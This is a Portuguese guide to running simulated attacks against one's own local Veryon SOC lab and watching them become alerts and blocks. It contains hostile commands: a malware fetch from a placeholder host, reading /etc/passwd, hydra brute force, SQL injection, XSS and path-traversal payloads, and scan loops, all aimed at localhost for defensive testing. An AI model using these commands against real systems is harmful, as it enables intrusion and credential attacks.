# Guia de ataques simulados

Este guia mostra como atacar o Veryon e ver cada ataque atravessar o sistema até
virar alerta e resposta no painel. Tudo roda contra o seu próprio laboratório, na
sua máquina, em containers isolados. Nada aqui toca máquina de terceiro.

Antes de começar, tenha o Veryon no ar e o painel aberto em `http://localhost:5173`.
Deixe a tela de **Alertas** aberta num canto: é onde quase tudo aparece.

Use `--build` só na primeira vez ou quando o código mudar:

```bash
docker compose up -d --build
```

Do dia a dia em diante, pra subir o que estiver parado sem reconstruir nada:

```bash
docker compose up -d
```

Não dê `--build` por hábito antes de cada ataque: reconstruir recria o honeypot, gera
uma chave de host SSH nova e deixa portas presas pra trás, as três causas mais comuns
de "o ataque roda mas não aparece no painel". Se cair nisso, veja **Quando o ataque não
aparece** no fim deste guia.

Os endereços que os ataques usam:

| Alvo | Onde | O que é |
|---|---|---|
| Honeypot SSH | `localhost:2222` | Cowrie, aceita qualquer senha |
| Honeypot Telnet | `localhost:2223` | Cowrie |
| Juice Shop | `localhost:3000` | App web vulnerável de propósito |
| API do Veryon | `localhost:8000` | A própria API, que se observa |

---

## Aviso sobre senha no honeypot

O Cowrie grava em texto claro tudo que você digita numa sessão, **senha inclusive**.
Se você logar no honeypot digitando uma senha que usa de verdade em outro lugar, ela
fica gravada no log do container. Use sempre senha descartável nos testes.

O honeypot aceita quase qualquer senha, com duas exceções de propósito: para o usuário
`root`, ele **recusa** as senhas `root` e `123456`. São as duas senhas mais óbvias, e
deixá-las na lista de recusa serve para separar quem quer entrar (usa outra senha e
consegue) de quem está só chutando as óbvias (leva falha atrás de falha). Isso importa
nas duas primeiras simulações: uma quer o login dando certo, a outra quer ele falhando.

---

## 1. Login no honeypot SSH

O ataque mais simples e o melhor pra confirmar que o pipeline inteiro funciona.

**Terminal:** qualquer um com cliente SSH (o próprio PowerShell do Windows já tem).

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
```

O `UserKnownHostsFile=/dev/null` faz o login não gravar nem ler a chave de host do
honeypot, então ele não quebra quando o container é recriado e a chave muda (no
PowerShell do Windows, troque `/dev/null` por `NUL`). Se você já pegou o erro
`REMOTE HOST IDENTIFICATION HAS CHANGED`, limpe a entrada velha uma vez com
`ssh-keygen -R "[localhost]:2222"`.

Quando pedir senha, digite qualquer coisa **menos** `root` ou `123456`, que o honeypot
recusa (por exemplo `entrar-2026`). Ele aceita e te joga num shell falso. Digite alguns
comandos pra deixar rastro:

```bash
whoami
```

```bash
cat /etc/passwd
```

```bash
wget http://exemplo/malware.sh
```

Saia com `exit`.

**O que esperar no painel:** em poucos segundos, na tela de **Alertas**, aparece um
alerta **high** com título "Login bem-sucedido no honeypot", técnica MITRE **T1110**
(força bruta). Os comandos que você digitou viram eventos separados na tela de
**Eventos**, com `source` igual a `cowrie`.

---

## 2. Força bruta de SSH

Simula um atacante chutando senha atrás de senha, todas erradas.

Aqui a senha certa é `123456`: como o honeypot recusa ela de propósito para o `root`
(veja o aviso acima), cada tentativa vira uma **falha**, que é o que a força bruta
precisa gerar.

**Terminal:** qualquer um com cliente SSH.

Rode o comando abaixo e, quando pedir a senha, digite `123456`. Repita **cinco vezes ou
mais**, na mesma janela de cinco minutos:

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
```

Se tiver o `hydra` (vem no Kali, ou `apt install hydra`), ele faz a rajada sozinho:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://localhost:2222
```

**O que esperar no painel:** os eventos de tentativa na tela de **Eventos**, e, quando
cinco falhas do mesmo IP se juntam em cinco minutos, um alerta **critical** "Força bruta
contra o honeypot SSH/Telnet" na tela de **Alertas**. É esse alerta critical que a
política **SSH-BRUTE**, na tela de **Prevenção**, reconhece. Como ela nasce em modo
observação, registra o que faria sem bloquear.

---

## 3. Bloquear o atacante, e ver o bloqueio valer

Depois que o alerta aparece, você tem o IP de origem. Vá tratar.

1. Na tela de **Alertas**, clique no alerta de honeypot pra abrir o detalhe.
2. Clique em **Bloquear**. O IP entra na blocklist.

**Como confirmar que bloqueou de verdade**, e não só na tela: o bloqueio age em dois
lugares. Tente logar de novo no honeypot com o mesmo IP:

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@localhost
```

A conexão é recusada, porque o `iptables` dentro do namespace do Cowrie derruba o
pacote. E qualquer requisição na API a partir daquele IP também leva 403, porque o
middleware ASGI recusa antes de chegar na rota.

Pra desbloquear um IP que **você** bloqueou pela tela, o botão fica na própria tela de
**Alertas**: abra o alerta de novo e clique em **Desbloquear**. A aba **Trilha de
ações** da tela de **Prevenção** desfaz o que uma *política* bloqueou sozinha, não o
bloqueio manual. Cada um se desfaz onde foi feito.

---

## 4. Varredura de vulnerabilidade

O Veryon tem um scanner (Nmap e Nuclei) que varre os serviços internos e o Juice
Shop. Você dispara pela tela, sem terminal nenhum.

1. Vá na tela de **Vulnerabilidades**.
2. Clique em **Rodar varredura agora**.

O botão trava enquanto a varredura roda (leva alguns minutos, a primeira vez baixa os
templates do Nuclei). Quando termina, a lista enche de achados reais do seu próprio
ambiente: portas abertas, serviços expostos, cabeçalhos faltando.

**O que observar:**

- Cada achado tem severidade, CVSS e a evidência que o scanner devolveu.
- O **score de risco do parque** no topo pondera tudo que está em aberto.
- Marque um achado como **Corrigida** e rode a varredura de novo. Se a condição ainda
  existir, ela **reabre sozinha** e o contador de reaberturas sobe. É o sistema
  dizendo que fecharam o chamado sem consertar.
- Tente marcar como **Risco aceito** sem preencher justificativa. A API recusa: risco
  aceito exige justificativa escrita e data de revisão.

---

## 5. Injeção contra a API

Aqui o alvo é a própria API do Veryon, que observa o próprio tráfego. Você manda
requisição com padrão de ataque na query e o motor de análise pontua.

**Terminal:** qualquer um com `curl`.

SQL injection na query:

```bash
curl "http://localhost:8000/events?source=%27%20OR%201%3D1--"
```

Cross-site scripting:

```bash
curl "http://localhost:8000/alerts?status=%3Cscript%3Ealert(1)%3C/script%3E"
```

Path traversal:

```bash
curl "http://localhost:8000/vulnerabilities?asset_type=../../../../etc/passwd"
```

Repare que os payloads vão percent-encoded (`%27` é a aspa, `%20` o espaço). É assim
que um atacante de verdade manda, e o motor decodifica antes de casar o padrão.

**O que esperar:** em até 10 segundos, na tela de **Análise de API**, aparece um
achado pro seu IP com o sinal **Tentativa de injeção** (peso 40) e a lista exata dos
padrões detectados. Clique no achado pra ver as requisições que o geraram.

---

## 6. Varredura de rotas e rajada de login

Dois sinais que aparecem juntos num ataque de reconhecimento.

Varredura de rotas (muitos caminhos que não existem, quase todos 404):

```bash
for i in $(seq 1 25); do
  curl -s -o /dev/null "http://localhost:8000/admin/painel-secreto-$i"
done
```

Rajada de falha de autenticação:

```bash
for i in $(seq 1 15); do
  curl -s -o /dev/null -X POST "http://localhost:8000/auth/login" \
       -d "username=admin&password=errada$i&website="
done
```

**O que esperar:** o achado de API pro seu IP soma três sinais, não dois. **Varredura
de rotas** (peso 25) pelas rotas inexistentes, **Rajada de falha de autenticação** (peso
30) pelos 401 e 429 no login, e **Acesso a endpoint sensível** (peso 15), porque
`/admin/...` conta como rota sensível. A soma dá 70, e 70 já é o suficiente: um alerta
automático nasce na tela de **Alertas**. Se você juntar a injeção da seção 5 no mesmo
IP, a soma passa de 90, o caso fica disponível pra prevenção tratar e aparece na
**fila crítica**.

---

## 7. Analisar API de fora (ingestão de log)

Esta é a função que transforma o Veryon de "observa a si mesmo" em "observa a API de
um cliente". Um gateway externo manda o log de acesso em lote, e o mesmo motor de
sinais roda em cima.

Precisa da chave `INGEST_API_KEY` que você definiu no `.env`. Sem chave configurada,
o endpoint recusa tudo (é de propósito).

O exemplo abaixo simula um atacante fazendo varredura sequencial de objetos, puxando
`/customers/1`, `/customers/2`, e assim por diante, o clássico IDOR/BOLA. Troque
`SUA_CHAVE_AQUI` pela sua chave.

```bash
curl -X POST "http://localhost:8000/ingest/api-logs" \
  -H "X-Veryon-Key: SUA_CHAVE_AQUI" \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [
      {"method":"GET","path":"/api/v1/customers/1","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/2","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/3","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/4","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/5","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/6","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/7","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200},
      {"method":"GET","path":"/api/v1/customers/8","status_code":200,"client_ip":"203.0.113.77","response_bytes":1200}
    ]
  }'
```

A resposta é `{"aceitas":8,"descartadas":0}`. Se você mandar a chave errada, leva
`401`.

**O que esperar:** o IP `203.0.113.77` aparece na **Análise de API** com o sinal
**Acesso sequencial a objetos**. Como `/api/v1/customers/{id}` não está no inventário
declarado da aplicação, ele também soma **API fantasma respondendo**. Dois sinais que
só a ingestão externa produz, porque dependem de rotas que não são do próprio Veryon.

---

## 8. Ligar uma política e ver a prevenção agir

Depois de gerar tráfego de ataque, vá na tela de **Prevenção**, aba **Políticas**.

1. Escolha a política **API-INJ** (Tentativa de injeção).
2. Clique em **Simular**. Ela mostra os alvos de agora e diz quais **seriam
   segurados** pelos trilhos de segurança, sem fazer nada ainda.
3. Se um IP público aparecer como "seria bloqueado", clique em **Observando** pra
   mudar pra **Em vigor**.

Em segundos, a política aplica o bloqueio de verdade. Vá na aba **Trilha de ações** e
veja a linha `applied`, com o alvo e o motivo. IPs internos ou reservados aparecem
como `held`, com o trilho que os segurou.

Clique em **Desfazer**. O bloqueio sai, e a política respeita a decisão: ela não
rebloqueia o mesmo alvo por uma hora.

Quando terminar de testar, volte a política pra **Observando**. É o estado de fábrica
seguro: nenhuma política bloqueia nada sozinha até você mandar.

---

## 9. Ver o mapa de origem

Depois de gerar tráfego de vários IPs (os exemplos acima usam faixas de documentação
como `203.0.113.x`, que são reservadas), vá no **Dashboard**.

No gráfico de colunas, clique no filtro **Origem dos IPs**. O cartão gira e revela o
mapa-múndi. IP público identificado vira ponto no país de origem; tráfego de rede
interna e IP não identificado são contados à parte, porque um não tem país pra
descobrir e o outro ainda não foi enriquecido.

Rodando tudo na sua máquina, espere o mapa **vazio**, com todo o tráfego caindo na
contagem de rede interna. O ataque ao honeypot sai sempre do mesmo IP interno do Docker,
e as faixas usadas contra a API (`203.0.113.x`, `198.51.100.x`) são reservadas para
documentação, então não têm país. O mapa se enche quando o Veryon recebe tráfego de IP
público de verdade, num honeypot exposto ou lendo o log de uma aplicação real.

---

## Resumo: um ataque completo do começo ao fim

Pra uma demonstração de ponta a ponta, nesta ordem:

1. Login no honeypot SSH (seção 1). Alerta nasce.
2. Injeção e varredura contra a API (seções 5 e 6). Achado de API sobe de score.
3. Alerta automático nasce quando o score passa de 70.
4. O caso entra na fila crítica da tela de Prevenção.
5. Você bloqueia, confirma que o bloqueio vale nos dois atuadores, e desfaz.
6. O mapa mostra de onde veio.

Cada passo deixa rastro visível no painel. É o pipeline inteiro de um SOC, do
primeiro pacote até a resposta, rodando na sua máquina.

---

## Quando o ataque não aparece

O ataque roda, o terminal responde, mas nada surge nos Alertas nem nos Eventos. Quase
sempre é um destes três, e os três nascem do hábito de reconstruir a stack toda hora.

**1. Porta do honeypot presa num container morto.** No Docker Desktop do Windows, depois
que a máquina dorme ou o Docker se atualiza, o encaminhamento da porta `2222` pode ficar
apontando pra um honeypot já derrubado. O ataque conecta, recebe o shell falso, mas o log
vai pro container morto e o Veryon atual não lê aquilo. Para confirmar, pare o honeypot e
tente conectar mesmo assim:

```bash
docker compose stop cowrie
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost
```

Se ainda responder com o honeypot parado, há um processo fantasma segurando a porta. O
conserto é reiniciar o Docker Desktop de verdade (bandeja → Quit → abrir de novo); um
`docker compose down` sozinho não solta o encaminhamento. Pelo terminal, o equivalente é
`wsl --shutdown` seguido de reabrir o Docker Desktop. Depois `docker compose up -d`.

**2. `REMOTE HOST IDENTIFICATION HAS CHANGED`.** Cada recriação do honeypot gera uma
chave de host nova; o cliente SSH guardou a antiga e recusa. `StrictHostKeyChecking=no`
não cobre esse caso. Use o comando de login que não toca no `known_hosts` (com
`UserKnownHostsFile=/dev/null`, ou `NUL` no PowerShell), ou limpe a entrada velha uma vez
com `ssh-keygen -R "[localhost]:2222"`.

**3. Relógios fora de sincronia.** Se o host e os containers ficarem com horas muito
diferentes (também comum depois que a máquina dorme), eventos entram com data no passado e
somem das telas por janela de tempo. `wsl --shutdown` e reabrir o Docker Desktop realinha.

Se nada disso for o caso, confirme que a cadeia está no ar e que o coletor está lendo o
honeypot: `docker compose ps` e `docker compose logs collector --tail 20` (deve aparecer
`collector iniciado, lendo .../cowrie.json` e, após um login, linhas de evento gravado).
